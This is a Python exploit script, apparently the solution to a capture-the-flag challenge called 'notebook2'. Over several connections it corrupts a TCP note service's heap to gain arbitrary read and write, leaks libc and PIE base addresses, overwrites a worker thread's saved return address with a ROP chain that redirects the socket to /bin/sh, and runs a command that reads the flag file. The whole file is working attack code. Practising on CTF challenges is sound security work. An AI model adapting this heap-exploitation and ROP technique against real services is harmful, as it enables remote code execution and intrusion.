#!/usr/bin/env python3
import argparse
import collections
import socket
import struct
import subprocess
import sys
import time

MAGIC = 0xBEEF1337
CTRL = 0x2000
CH = 0x10
CREATE, OPEN, EDIT, VIEW, CLOSE, LIST, RENAME, TRUNC, STAT, COPY = range(1, 11)

# Offsets for the pinned Ubuntu 24.04 base image in the provided Dockerfile.
LIBC_MAIN_ARENA = 0x1E5AC0
LIBC_ENVIRON    = 0x1ECE28
LIBC_DUP2       = 0x0FF880
LIBC_SYSTEM     = 0x053110
LIBC_BINSH      = 0x1A5EA4
LIBC_POP_RDI    = 0x02A145
LIBC_POP_RSI    = 0x02BAA9
LIBC_RET        = 0x02846B

# Offsets inside prob.
PROB_CONNS                  = 0x4060
PROB_RET_AFTER_HANDLE_EVENT = 0x182F
PIE_STACK_HINTS = [0x1AE0, 0x1993, 0x1AC9, 0x1965, 0x0550, 0x0575, 0x1C57, 0x17F9, 0x182F]

p32 = lambda x: struct.pack('<I', x & 0xFFFFFFFF)
p64 = lambda x: struct.pack('<Q', x & 0xFFFFFFFFFFFFFFFF)
u32 = lambda b: struct.unpack('<I', b[:4])[0]
u64 = lambda b: struct.unpack('<Q', b[:8])[0]


def z(s: bytes | str, n: int = 0x20) -> bytes:
    if isinstance(s, str):
        s = s.encode()
    return s[: n - 1] + b'\0' * (n - len(s[: n - 1]))


def recvn(sock: socket.socket, n: int) -> bytes:
    out = b''
    while len(out) < n:
        chunk = sock.recv(n - len(out))
        if not chunk:
            raise EOFError('socket closed')
        out += chunk
    return out


class Client:
    def __init__(self, host: str, port: int, timeout: float = 5.0):
        deadline = time.time() + timeout
        last_exc = None
        while time.time() < deadline:
            try:
                self.s = socket.create_connection((host, port), timeout=0.25)
                self.s.settimeout(timeout)
                return
            except OSError as e:
                last_exc = e
                time.sleep(0.03)
        raise last_exc if last_exc else RuntimeError('connection failed')

    def send_evt(self, op: int, data: bytes = b'') -> None:
        body = struct.pack('<II', CTRL | CH | op, len(data)) + data
        self.s.sendall(struct.pack('<II', MAGIC, len(body)) + body)

    def recv_evt(self) -> tuple[int, bytes]:
        magic, body_len = struct.unpack('<II', recvn(self.s, 8))
        if magic != MAGIC:
            raise RuntimeError(f'bad magic: {magic:#x}')
        body = recvn(self.s, body_len)
        evt_type, _ = struct.unpack('<II', body[:8])
        return evt_type, body[8:]

    def list(self, n: int = 0) -> int:
        self.send_evt(LIST, b'A' * n)
        return u32(self.recv_evt()[1])

    def sync(self) -> int:
        return self.list(0)

    def create(self, name: str, token: str = 'tok', content: bytes = b'', sync: bool = True) -> None:
        self.send_evt(CREATE, z(name) + z(token) + p32(0) + p32(len(content)) + content)
        if sync:
            self.sync()

    def open(self, name: str, token: str = 'tok', sync: bool = True) -> None:
        self.send_evt(OPEN, z(name) + z(token))
        if sync:
            self.sync()

    def edit(self, data: bytes, sync: bool = True) -> None:
        self.send_evt(EDIT, data)
        if sync:
            self.sync()

    def close_note(self, sync: bool = True) -> None:
        self.send_evt(CLOSE, b'')
        if sync:
            self.sync()

    def view(self) -> bytes:
        self.send_evt(VIEW, b'')
        return self.recv_evt()[1]

    def raw(self) -> socket.socket:
        return self.s


def note_struct(name: bytes = b'fake', token: bytes = b'tok', closed: int = 0,
                length: int = 0x100, content: int = 0, nextp: int = 0) -> bytes:
    return z(name) + z(token) + p32(closed) + p32(length) + p64(content) + p64(nextp)


def build_primitive(host: str, port: int):
    A = Client(host, port)
    B = Client(host, port)

    for _ in range(7):
        A.list(0)
    for _ in range(7):
        A.list(0x58)
    for _ in range(7):
        B.list(0)
    for _ in range(7):
        B.list(0x40)

    A.create('victim', 'tok', b'V' * 0x58)
    A.create('dummy',  'tok', b'D' * 0x58)
    A.open('victim', 'tok')
    B.open('victim', 'tok')

    A.close_note()
    A.open('dummy', 'tok')
    A.close_note()
    B.close_note()

    A.create('holder', 'tok', b'H' * 0x58)
    A.open('holder', 'tok')

    for _ in range(3):
        A.list(0)
        A.list(0x58)

    T = Client(host, port)
    for _ in range(7):
        T.list(0)
    for _ in range(7):
        T.list(0x40)

    T.create('unsorted', 'tok', b'U' * 0x800)
    fillers = []
    for i in range(7):
        name = f'fill{i}'
        fillers.append(name)
        T.create(name, 'tok', bytes([0x41 + i]) * 0x800)
    for name in fillers:
        T.open(name, 'tok')
        T.close_note()
    T.open('unsorted', 'tok')
    T.close_note()

    B.create('znote', 'tok', b'')

    raw = A.view()
    nextp = u64(raw[0x50:0x58])

    def forge(addr: int, size: int = 0x100, name: bytes = b'fake', token: bytes = b'tok') -> None:
        A.edit(note_struct(name, token, 0, size, addr, nextp))

    forge(0, 0x58)
    B.open('fake', 'tok')

    def arb_read(addr: int, n: int) -> bytes:
        out = b''
        for off in range(0, n, 0x800):
            m = min(0x800, n - off)
            forge(addr + off, m)
            out += B.view()[:m]
        return out

    def arb_write(addr: int, data: bytes) -> None:
        forge(addr, len(data))
        B.edit(data)

    return A, B, T, arb_read, arb_write, nextp


def leak_libc_and_pie(read, head: int) -> tuple[int, int]:
    ptr = head
    bk = None
    for _ in range(20):
        ns = read(ptr, 0x58)
        name = ns[:0x20].split(b'\0', 1)[0]
        content = u64(ns[0x48:0x50])
        nxt = u64(ns[0x50:0x58])
        if name == b'unsorted':
            bk = u64(read(content + 8, 8))
            break
        ptr = nxt
    if bk is None:
        raise RuntimeError('failed to find unsorted note in arena chain')

    arena = (bk & ~0xFFF) + 0x30
    seen = set()
    main_arena = None
    for _ in range(8):
        if arena in seen:
            break
        seen.add(arena)
        nxt = u64(read(arena + 0x870, 8))
        if (nxt & 0xFFF) != 0x30:
            main_arena = nxt
            break
        arena = nxt
    if main_arena is None:
        raise RuntimeError('failed to reach main_arena from thread arena ring')

    libc = main_arena - LIBC_MAIN_ARENA

    envptr = u64(read(libc + LIBC_ENVIRON, 8))
    blob = read(envptr - 0x2500, 0x3000)
    cnt = collections.Counter()
    for off in range(0, len(blob) - 8, 8):
        q = struct.unpack_from('<Q', blob, off)[0]
        for roff in PIE_STACK_HINTS:
            cand = q - roff
            if (cand & 0xFFF) == 0 and 0x500000000000 <= cand < 0x600000000000:
                cnt[cand] += 1
    if not cnt:
        raise RuntimeError('failed to derive PIE base from main stack')
    pie, score = cnt.most_common(1)[0]
    if score < 2:
        raise RuntimeError(f'PIE candidate too weak: {pie:#x} (score={score})')
    return libc, pie


def solve_once(host: str, port: int, cmd: bytes) -> bytes:
    A, B, _T, read, _write, head = build_primitive(host, port)
    libc, pie = leak_libc_and_pie(read, head)

    conns = pie + PROB_CONNS
    conns_blob = read(conns, 24 * 8)
    target_ret = pie + PROB_RET_AFTER_HANDLE_EVENT

    target_client = None
    target_fd = None
    saved_rip = None

    clients = {'holder': A, 'fake': B}
    for i in range(8):
        ent = conns_blob[i * 24:(i + 1) * 24]
        fd = struct.unpack('<i', ent[:4])[0]
        tid = u64(ent[8:16])
        cur = u64(ent[16:24])
        if fd < 0 or tid == 0 or cur == 0:
            continue
        try:
            note_name = read(cur, 0x20).split(b'\0', 1)[0].decode(errors='ignore')
        except Exception:
            continue
        cli = clients.get(note_name)
        if cli is None:
            continue
        stack_start = tid - 0x20000
        stack = read(stack_start, 0x20000)
        for off in range(0, len(stack) - 8, 8):
            if u64(stack[off:off + 8]) == target_ret:
                target_client = cli
                target_fd = fd
                saved_rip = stack_start + off
                break
        if saved_rip is not None:
            break

    if saved_rip is None or target_client is None or target_fd is None:
        raise RuntimeError('failed to map a live client to a worker saved RIP')

    chain = p64(libc + LIBC_RET)
    for fd_to in (0, 1, 2):
        chain += p64(libc + LIBC_POP_RDI) + p64(target_fd)
        chain += p64(libc + LIBC_POP_RSI) + p64(fd_to)
        chain += p64(libc + LIBC_DUP2)
    chain += p64(libc + LIBC_RET)
    chain += p64(libc + LIBC_POP_RDI) + p64(libc + LIBC_BINSH)
    chain += p64(libc + LIBC_SYSTEM)

    A.edit(note_struct(b'fake', b'tok', 0, len(chain), saved_rip, head))
    target_client.send_evt(EDIT, chain)
    time.sleep(0.2)

    sh = target_client.raw()
    sh.settimeout(1.0)
    sh.sendall(cmd + b'\n')

    out = b''
    deadline = time.time() + 2.0
    while time.time() < deadline:
        try:
            chunk = sh.recv(4096)
            if not chunk:
                break
            out += chunk
        except (socket.timeout, TimeoutError, OSError):
            break
    return out


def wait_for_service(host: str, port: int, timeout: float = 3.0) -> None:
    deadline = time.time() + timeout
    last_exc = None
    while time.time() < deadline:
        try:
            s = socket.create_connection((host, port), timeout=0.2)
            s.close()
            return
        except OSError as e:
            last_exc = e
            time.sleep(0.05)
    raise last_exc if last_exc else RuntimeError('service not reachable')


def main() -> int:
    ap = argparse.ArgumentParser(description='Container-style exploit for notebook2')
    ap.add_argument('--host', default='127.0.0.1')
    ap.add_argument('--port', type=int, default=5000)
    ap.add_argument('--attempts', type=int, default=8)
    ap.add_argument('--cmd', default='echo READY; id; cat /home/pwn/flag 2>/dev/null || cat flag 2>/dev/null; exit')
    ap.add_argument('--spawn-binary', help='optional local testing helper: spawn this binary before exploiting')
    ap.add_argument('--cwd', help='cwd for --spawn-binary')
    args = ap.parse_args()

    last_err = None
    for attempt in range(1, args.attempts + 1):
        proc = None
        try:
            if args.spawn_binary:
                proc = subprocess.Popen([args.spawn_binary, str(args.port)], cwd=args.cwd,
                                        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                time.sleep(0.1)
            wait_for_service(args.host, args.port)
            out = solve_once(args.host, args.port, args.cmd.encode())
            sys.stdout.buffer.write(out)
            if not out.endswith(b'\n'):
                sys.stdout.buffer.write(b'\n')
            return 0
        except Exception as e:
            last_err = e
            print(f'[-] attempt {attempt}/{args.attempts} failed: {e}', file=sys.stderr)
            time.sleep(0.1)
        finally:
            if proc is not None:
                proc.terminate()
                try:
                    proc.wait(timeout=1)
                except subprocess.TimeoutExpired:
                    proc.kill()
    print(f'[-] exploit failed after {args.attempts} attempts: {last_err}', file=sys.stderr)
    return 1


if __name__ == '__main__':
    raise SystemExit(main())
